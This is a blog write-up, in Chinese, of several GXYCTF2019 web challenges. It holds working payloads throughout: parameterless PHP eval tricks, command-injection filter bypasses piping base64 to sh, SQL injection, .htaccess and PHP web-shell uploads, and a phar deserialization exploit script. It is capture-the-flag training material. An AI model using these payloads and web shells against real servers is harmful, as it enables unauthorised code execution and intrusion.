---
title: GXYCTF2019-web
date: 2020-04-26 15:52:11
updated: 2020-04-26 15:52:11
tags:
 - ctf
 - web
 - 刷题
 - gxyctf2019
categories:
 - 刷题记录
---

# web

## 禁止套娃

扫描目录发现git泄露

<!--more-->

```
---- Scanning URL: http://3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn/ ----
==> DIRECTORY: http://3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn/.git/
+ http://3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn/flag.php (CODE:200|SIZE:0)
+ http://3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn/.git/index (CODE:200|SIZE:137)
+ http://3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn/.git/config (CODE:200|SIZE:92)
+ http://3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn/.git/ (CODE:403|SIZE:571)
```

使用githack复原代码得到

 ```php
//index.php
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
 ```

第二个正则不大能看懂，于是百度一下得到考点：**无参数rec**  skysec师傅的[文章](https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/)介绍得很详细

>能执行a(b()),a()之类的函数，a("1"),这样就不行。

看完skysec师傅的文章后知道了第二个正则匹配的的意思

 第一个正则的意思payload是不能使用包含下列字符串的伪协议

```
data://,php://,phar://,filter://
```

第三个也是payload不能包含下列字符串 

```
et|na|info|dec|bin|hex|oct|pi|log
```

使用session_id进行无参数rce，

过滤了et，不能使用file_get_contents,之类的函数，但是可以使用highlight_file、show_source

payload

```
exp=show_source(session_id(session_start()));
```

修改cookie中PHPSESSID=flag.php

访问即可拿到flag

## Ping Ping Ping

打开题目给出了`/?ip=`是命令注入 

过滤了空格，`$IFS`,`,`可以代替空格

反引号扩起来的表示取结果

paylaod:

```
?ip=127.0.0.1;cat$IFS`ls`;
```

看到了过滤源码

```php
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "<pre>";
  print_r($a);
}

?>
```

参考[王叹之师傅的博客](https://www.cnblogs.com/wangtanzhi/p/12246386.html)还可以可以进行变量赋值

```bahs
sunny250@QAQdeMacBook ~ % b=asd
sunny250@QAQdeMacBook ~ % echo $b
asd

```

于是又得到另一种payload

```
/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
```

过滤了bash，还可以执行sh，通过编码绕过

```
echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
```



绕过空格方式（参考来之颖奇师傅的[博客](https://www.gem-love.com/ctf/516)）

>$IFS
>
>${IFS}
>
>$IFS$9
>
><
>
><>
>
>{cat,flag.php} //用逗号实现了空格功能，需要用`{}`括起来
>
>%20
>
>%09 

## [GXYCTF2019]BabySQli

题目给了提示

```html
<!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5-->
```

base32后base64解码得到

```
select * from user where username = '$name'
```

给出了闭合方式

经过测试过滤了or，大写绕过。然后是常规sql

```
name=admin'union select 1,2,3#&pw=
//wrong pass!
```

```
name='union select 1,'admin',3#&pw=
//wrong pass!
```

发现直接填写密码是错误的，尝试MD5，成功

```
name='union select 1,'admin','21232f297a57a5a743894a0e4a801fc3'#&pw=admin
//flag{db82a88f-343e-4c70-9761-a50345e1ef8c}
```



## BabyUpload

上传.haccess,1.ww。MIME : image/jpeg

```http
POST / HTTP/1.1
Host: eb3b2c5c-5ebe-4485-b09e-054c41fd176e.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------21225023787917569654236041647
Content-Length: 398
Origin: http://eb3b2c5c-5ebe-4485-b09e-054c41fd176e.node3.buuoj.cn
Connection: close
Referer: http://eb3b2c5c-5ebe-4485-b09e-054c41fd176e.node3.buuoj.cn/
Cookie: PHPSESSID=4c25aec0ff86fd39ba68c58584a387a8
Upgrade-Insecure-Requests: 1

-----------------------------21225023787917569654236041647
Content-Disposition: form-data; name="uploaded"; filename="1.ww"
Content-Type: image/jpeg

GIF89a
<script language="php"> 
eval($_POST[cmd]);
</script>
-----------------------------21225023787917569654236041647
Content-Disposition: form-data; name="submit"

ä¸ä¼ 
-----------------------------21225023787917569654236041647--
```

```http
POST / HTTP/1.1
Host: eb3b2c5c-5ebe-4485-b09e-054c41fd176e.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------4018079373823486313032354502
Content-Length: 444
Origin: http://eb3b2c5c-5ebe-4485-b09e-054c41fd176e.node3.buuoj.cn
Connection: close
Referer: http://eb3b2c5c-5ebe-4485-b09e-054c41fd176e.node3.buuoj.cn/
Cookie: PHPSESSID=4c25aec0ff86fd39ba68c58584a387a8
Upgrade-Insecure-Requests: 1

-----------------------------4018079373823486313032354502
Content-Disposition: form-data; name="uploaded"; filename=".htaccess"
Content-Type: image/jpeg

#define height 12
#define width 12
AddType application/x-httpd-php .ww
php_value auto_append_file "1.ww"
-----------------------------4018079373823486313032354502
Content-Disposition: form-data; name="submit"

ä¸ä¼ 
-----------------------------4018079373823486313032354502--
```

蚁剑连接即可

## BabysqliV3.0

admin，password弱密码直接登入

登入后看见连接，尝试为协议读取源码

```php+HTML
//upload.php
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 

<form action="" method="post" enctype="multipart/form-data">
	上传文件
	<input type="file" name="file" />
	<input type="submit" name="submit" value="上传" />
</form>

<?php
error_reporting(0);
class Uploader{
	public $Filename;
	public $cmd;
	public $token;
	

	function __construct(){
		$sandbox = getcwd()."/uploads/".md5($_SESSION['user'])."/";
		$ext = ".txt";
		@mkdir($sandbox, 0777, true);
		if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){
			$this->Filename = $_GET['name'];
		}
		else{
			$this->Filename = $sandbox.$_SESSION['user'].$ext;
		}

		$this->cmd = "echo '<br><br>Master, I want to study rizhan!<br><br>';";
		$this->token = $_SESSION['user'];
	}

	function upload($file){
		global $sandbox;
		global $ext;

		if(preg_match("[^a-z0-9]", $this->Filename)){
			$this->cmd = "die('illegal filename!');";
		}
		else{
			if($file['size'] > 1024){
				$this->cmd = "die('you are too big (′▽`〃)');";
			}
			else{
				$this->cmd = "move_uploaded_file('".$file['tmp_name']."', '" . $this->Filename . "');";
			}
		}
	}

	function __toString(){
		global $sandbox;
		global $ext;
		// return $sandbox.$this->Filename.$ext;
		return $this->Filename;
	}

	function __destruct(){
		if($this->token != $_SESSION['user']){
			$this->cmd = "die('check token falied!');";
		}
		eval($this->cmd);
	}
}

if(isset($_FILES['file'])) {
	$uploader = new Uploader();
	$uploader->upload($_FILES["file"]);
	if(@file_get_contents($uploader)){
		echo "下面是你上传的文件：<br>".$uploader."<br>";
		echo file_get_contents($uploader);
	}
}

?>

```

在析构方法中看见了`eval`函数,还看见了`__toString`应该是序列化没错了，但是没看见unserialize，那就是phar序列化

寻找pop链接
>在最后的判断函数中，file_get_contents会触发`__toString`,filename可控，在`__destruct`中执行
>

编写phar脚本

```php
<?php
class Uploader{
    public $Filename;
    public $cmd;
    public $token;

    public function __construct()
    {
        $this->cmd='show_source("flag.php");';
        $this->token='GXYfddf1387c1384a5dd61134d16247860b';
        $this->Filename='test';
    }
}

$a = new Uploader();
echo serialize($a);

@unlink('poc.phar');
$phar = new Phar("poc.phar");
$phar->startBuffering();
$phar->setStub("GIF89a __HALT_COMPILER(); ?>");
$phar->setMetadata($a); 
$phar->addFromString("1", "0"); 
$phar->stopBuffering();
```

在`__destruct`函数中,token要等于session

```php
function __destruct(){
		if($this->token != $_SESSION['user']){
			$this->cmd = "die('check token falied!');";
		}
		eval($this->cmd);
	}
```

在`__construct`中给出了存在session的位置

```php
function __construct(){
		$sandbox = getcwd()."/uploads/".md5($_SESSION['user'])."/";
		$ext = ".txt";
		@mkdir($sandbox, 0777, true);
		if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){
			$this->Filename = $_GET['name'];
		}
		else{
			$this->Filename = $sandbox.$_SESSION['user'].$ext;
		}

		$this->cmd = "echo '<br><br>Master, I want to study rizhan!<br><br>';";
		$this->token = $_SESSION['user'];
	}
```

随意上传一下文件得到session

```
下面是你上传的文件：
/var/www/html/uploads/e9791ad48bd0c6877a17604b0ad113bb/GXYfddf1387c1384a5dd61134d16247860b.txt
```

比如此处**GXYfddf1387c1384a5dd61134d16247860b**就是session

然后上传poc.phar文件，得到文件地址，再随意上传一个文件同时传入参数name

```
payload：
home.php?file=upload&name=phar:///var/www/html/uploads/e9791ad48bd0c6877a17604b0ad113bb/GXYfddf1387c1384a5dd61134d16247860b.txt
```

即可得到flag



**非预期**

看见P3师傅直接上传拿shell。

```http
POST /home.php?file=upload&name=shell.php HTTP/1.1
Host: 67c9597a-eae1-4272-a2bc-8b0d0444e98f.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------1489141389572370543625846861
Content-Length: 354
Origin: http://67c9597a-eae1-4272-a2bc-8b0d0444e98f.node3.buuoj.cn
Connection: close
Referer: http://67c9597a-eae1-4272-a2bc-8b0d0444e98f.node3.buuoj.cn/home.php?file=upload&name=phar:///var/www/html/uploads/e9791ad48bd0c6877a17604b0ad113bb/GXYfddf1387c1384a5dd61134d16247860b.txt
Cookie: PHPSESSID=7b53797fc49085aab012e24a85e31c46
Upgrade-Insecure-Requests: 1

-----------------------------1489141389572370543625846861
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: text/php

<?php eval($_POST[1]);?>
-----------------------------1489141389572370543625846861
Content-Disposition: form-data; name="submit"

ä¸ä¼ 
-----------------------------1489141389572370543625846861-
```

蚁剑连接即可。

[颖奇师傅博客](https://www.gem-love.com/ctf/490.html)还有一个非预期,直接随意上传文件把name参数改成flag.php。即可拿到flag



## StrongestMind

直接写一个脚本自动提交即可[来自h3zh1师傅的脚本](https://www.cnblogs.com/h3zh1/p/12702655.html)

```python
 url = "http://b4d1633d-5d1c-4b71-bedc-3545bea05581.node3.buuoj.cn/index.php"
s = requests.session()
rr = re.compile(r"[0-9]+ [+|-] [0-9]+")

r = s.get(url)
r.encoding = "utf-8"
data = {"answer":eval(rr.findall(r.text)[0])}
r = s.post(url,data=data)

for i in range(1000):
    answer = eval(rr.findall(r.text)[0])
    data = { "answer" : answer }
    r = s.post( url , data=data)
    r.encoding = "utf-8"
    print('[+%d]:'%(i) + str(answer))

print(r.text)
```